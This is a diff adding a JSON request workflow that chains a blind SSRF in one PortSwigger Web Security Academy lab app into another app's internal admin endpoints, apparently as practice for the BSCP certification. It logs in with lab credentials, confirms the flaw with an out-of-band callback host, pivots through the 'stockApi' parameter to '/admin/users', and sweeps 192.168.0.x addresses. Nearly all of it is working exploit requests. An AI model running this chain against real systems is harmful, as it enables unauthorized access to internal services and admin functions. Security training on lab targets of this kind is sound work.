@@ -1,0 +1,63 @@
+{
+  "_doc": "Cross-app SSRF: use a Blind SSRF vulnerability in App A's admin panel to force App A's backend to send a request to App B's internal endpoints. Classic BSCP 'two-app' twist - the apps LOOK isolated but the exploit path bridges them. This workflow assumes you've already found the SSRF entry point and have valid admin creds for App A.",
+
+  "vars": {
+    "app_a": "https://YOUR-APP-A.web-security-academy.net",
+    "app_b": "https://YOUR-APP-B.web-security-academy.net",
+    "oob_host": "YOUR-OAST-HOST.interactsh-server-or-similar",
+    "admin_user": "wiener",
+    "admin_pass": "peter"
+  },
+
+  "steps": [
+    {
+      "name": "login_to_app_a_admin",
+      "request": {
+        "method": "POST",
+        "url": "{{app_a}}/login",
+        "headers": {"Content-Type": "application/x-www-form-urlencoded"},
+        "body": "username={{admin_user}}&password={{admin_pass}}"
+      }
+    },
+
+    {
+      "_comment": "STEP 1 - Confirm the SSRF sink is real BEFORE attempting the pivot. Point it at your OAST host with a unique tag; any hit on the OAST log proves App A's backend made the request.",
+      "name": "confirm_ssrf_via_oast",
+      "request": {
+        "method": "POST",
+        "url": "{{app_a}}/admin/import-stock",
+        "headers": {"Content-Type": "application/x-www-form-urlencoded"},
+        "body": "stockApi=http://probe1.{{oob_host}}/check"
+      }
+    },
+
+    {
+      "_comment": "STEP 2 - Once SSRF is confirmed, pivot to App B's internal endpoint. App A's backend has IP-layer access to App B that you don't from outside. Often the internal endpoint exposes admin functionality without auth because it 'trusts' the source IP.",
+      "name": "pivot_a_to_b_internal_admin",
+      "request": {
+        "method": "POST",
+        "url": "{{app_a}}/admin/import-stock",
+        "headers": {"Content-Type": "application/x-www-form-urlencoded"},
+        "body": "stockApi={{app_b}}/admin/users"
+      },
+      "extract": {
+        "leaked_admin_users": {"regex": "<title>(.*?)</title>"}
+      }
+    },
+
+    {
+      "_comment": "STEP 3 - Look for an INTERNAL host the SSRF can reach (App B's localhost / private network). PortSwigger sometimes makes you guess internal IPs (192.168.0.0/24 sweep) or hostnames (intranet, internal-api, etc.) - this loop iterates a few common candidates.",
+      "name": "sweep_common_internal_targets",
+      "loop": {
+        "count": 5,
+        "var": "candidate_idx"
+      },
+      "request": {
+        "method": "POST",
+        "url": "{{app_a}}/admin/import-stock",
+        "headers": {"Content-Type": "application/x-www-form-urlencoded"},
+        "body": "stockApi=http://192.168.0.{{candidate_idx}}/admin"
+      }
+    }
+  ]
+}
